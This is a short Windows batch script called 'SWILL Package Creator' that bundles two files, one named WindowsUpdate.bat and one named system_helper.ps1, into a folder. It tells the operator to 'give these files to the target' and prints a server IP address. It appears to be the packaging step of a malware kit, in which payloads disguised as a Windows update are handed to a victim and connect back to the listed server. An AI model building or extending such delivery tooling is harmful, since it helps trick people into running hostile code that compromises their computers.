@echo off
title SWILL Package Creator
echo [SWILL] Creating deployment package...

mkdir SWILL_Deployment
copy WindowsUpdate.bat SWILL_Deployment\
copy system_helper.ps1 SWILL_Deployment\

echo [SWILL] Package created in SWILL_Deployment folder
echo [SWILL] Give these files to the target:
echo   - WindowsUpdate.bat
echo   - system_helper.ps1
echo.
echo [SWILL] Server IP: 92.115.78.187
pause